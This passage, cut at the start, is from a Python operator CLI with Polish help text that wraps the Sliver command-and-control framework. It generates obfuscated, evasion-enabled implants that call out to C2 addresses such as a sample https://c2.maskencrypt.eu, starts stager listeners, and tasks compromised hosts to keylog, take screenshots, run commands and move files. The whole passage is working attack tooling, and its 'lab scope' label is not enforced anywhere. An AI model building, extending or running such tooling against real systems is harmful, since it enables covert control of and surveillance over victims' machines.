        rows.append({"time": e.get("time", ""), "method": method,
                     "user": e.get("user", ""), "remote": e.get("remote_ip", "")})
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    if not rows:
        print("brak wpisów")
        return 0
    _print_table(rows, ["time", "user", "method", "remote"],
                 {"time": "Time", "user": "User", "method": "Method", "remote": "Remote"})
    return 0


async def action_log(client, args, log: OpsLog) -> int:
    body = " ".join(args.body or [])
    target = log.daily(f"Sliver ops — {args.heading}", body)
    log.record("manual-log", note=args.heading)
    print(f"daily += {target}")
    return 0


# ---------------------------------------------------------------- main

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Sliver operator CLI (lab scope)")
    p.add_argument("--config", default="", help="operator cfg (domyślnie auto)")
    p.add_argument("--vault", default="", help="vault Obsidian (domyślnie auto)")
    p.add_argument("--no-log", action="store_true", help="nie pisz do Obsidian")
    sub = p.add_subparsers(dest="cmd", required=True)

    sub.add_parser("version", help="wersja serwera")
    sub.add_parser("sessions", help="lista sesji")
    sub.add_parser("beacons", help="lista beaconów")
    sub.add_parser("jobs", help="lista jobów")
    sub.add_parser("profiles", help="lista profilów implantów")
    sub.add_parser("builds", help="lista buildów implantów")
    au = sub.add_parser("audit", help="log audytowy operatora")
    au.add_argument("--tail", type=int, default=0, help="ostatnie N wpisów")
    au.add_argument("--json", action="store_true")

    lg = sub.add_parser("log", help="ręczny wpis do Daily")
    lg.add_argument("heading")
    lg.add_argument("body", nargs="*", default="")

    jk = sub.add_parser("jobs-kill", help="zabij listener job")
    jk.add_argument("job_id")
    jk.add_argument("--yes", action="store_true")

    ps = sub.add_parser("profile-save", help="zapisz profil implantu")
    ps.add_argument("name")
    _add_implant_opts(ps)
    ps.add_argument("--yes", action="store_true")

    pd = sub.add_parser("profile-delete", help="usuń profil")
    pd.add_argument("name")
    pd.add_argument("--yes", action="store_true")

    bd = sub.add_parser("build-delete", help="usuń build")
    bd.add_argument("name")
    bd.add_argument("--yes", action="store_true")

    g = sub.add_parser("generate", help="generuj implant")
    g.add_argument("--name", required=True)
    g.add_argument("--profile", default="", help="generuj z zapisanego profilu")
    _add_implant_opts(g)
    g.add_argument("--save", default="", help="katalog zapisu (domyślnie artifacts)")
    g.add_argument("--dry-run", action="store_true", help="tylko pokaż config")
    g.add_argument("--yes", action="store_true")

    rg = sub.add_parser("regenerate", help="przebuduj istniejący build")
    rg.add_argument("name")
    rg.add_argument("--save", default="")
    rg.add_argument("--yes", action="store_true")

    st = sub.add_parser("stager-start", help="start stager listenera")
    st.add_argument("--profile", required=True)
    st.add_argument("--protocol", choices=["tcp", "http", "https"], required=True)
    st.add_argument("--host", default="0.0.0.0")
    st.add_argument("--port", type=int, required=True)
    st.add_argument("--cert", default="")
    st.add_argument("--key", default="")
    st.add_argument("--yes", action="store_true")

    t = sub.add_parser("task", help="taskuj sesję/beacon")
    t.add_argument("target", help="id (prefix) lub nazwa")
    t.add_argument("action", choices=[
        "screenshot", "keylog", "exec", "ps", "ls", "pwd", "cd",
        "download", "upload", "ping", "ifconfig", "netstat"])
    t.add_argument("--save", default="", help="katalog zapisu artefaktów")
    t.add_argument("--duration", type=int, default=15, help="keylog: czas w sekundach")
    t.add_argument("--cmd", dest="command", default="", help="exec: komenda")
    t.add_argument("args", nargs="*", help="exec: argumenty / ls: ścieżka / cd: ścieżka / download: ścieżka zdalna / upload: plik lokalny")
    t.add_argument("--recurse", action="store_true", help="download: rekurencyjnie")
    t.add_argument("--tcp", action="store_true")
    t.add_argument("--udp", action="store_true")
    t.add_argument("--no-listening", action="store_true")

    k = sub.add_parser("kill", help="zabij sesję/beacon")
    k.add_argument("target")
    k.add_argument("--force", action="store_true")
    k.add_argument("--yes", action="store_true")

    rn = sub.add_parser("rename", help="zmień nazwę sesji/beacona")
    rn.add_argument("target")
    rn.add_argument("name")

    for sp in ("sessions", "beacons", "jobs", "profiles", "builds"):
        sub.choices[sp].add_argument("--json", action="store_true")
    return p


def _add_implant_opts(sp: argparse.ArgumentParser) -> None:
    sp.add_argument("--os", default="windows")
    sp.add_argument("--arch", default="amd64")
    sp.add_argument("--c2-https", action="append", dest="c2", default=[],
                    help="adres C2 np. https://c2.maskencrypt.eu (repeatable)")
    sp.add_argument("--c2-http", action="append", dest="c2_http", default=[])
    sp.add_argument("--c2-mtls", action="append", dest="c2_mtls", default=[])
    sp.add_argument("--beacon", action="store_true", help="tryb beacon zamiast session")
    sp.add_argument("--interval", type=int, default=60, help="beacon interval (s)")
    sp.add_argument("--jitter", type=int, default=10, help="beacon jitter (s)")
    sp.add_argument("--reconnect", type=int, default=60, help="reconnect interval (s)")
    sp.add_argument("--format", choices=sorted(FORMATS), default="exe")
    sp.add_argument("--obfuscate", action="store_true")
    sp.add_argument("--evasion", action="store_true")
    sp.add_argument("--debug", action="store_true")


def _merge_c2(args) -> None:
    for u in getattr(args, "c2_http", []) or []:
        if not u.startswith("http://"):
            u = "http://" + u
        args.c2.append(u)
    for u in getattr(args, "c2_mtls", []) or []:
        if not u.startswith("mtls://"):
            u = "mtls://" + u
        args.c2.append(u)


async def amain(args) -> int:
    cfg_path = Path(args.config) if args.config else find_config()
    vault = Path(args.vault) if args.vault else find_vault()
    log = OpsLog(vault, no_log=args.no_log)
    _merge_c2(args)

    handlers = {
        "version": action_version, "sessions": action_sessions,
        "beacons": action_beacons, "jobs": action_jobs,
        "jobs-kill": action_jobs_kill, "profiles": action_profiles,
        "profile-save": action_profile_save, "profile-delete": action_profile_delete,
        "builds": action_builds, "build-delete": action_build_delete,
        "generate": _do_generate, "regenerate": action_regenerate,
        "stager-start": action_stager_start, "task": action_task,
        "kill": action_kill, "rename": action_rename,
        "audit": action_audit, "log": action_log,
    }
    handler = handlers.get(args.cmd)
    if handler is None:
        print(f"nieznana komenda: {args.cmd}")
        return 2

    if args.cmd in ("audit", "log"):
        return await handler(None, args, log)

    client = await connect(cfg_path)
    try:
        return await handler(client, args, log)
    finally:
        await client._channel.close()


def main() -> int:
    args = build_parser().parse_args()
    try:
        return asyncio.run(amain(args))
    except KeyboardInterrupt:
        return 130
    except Exception as exc:  # noqa: BLE001
        print(f"błąd: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
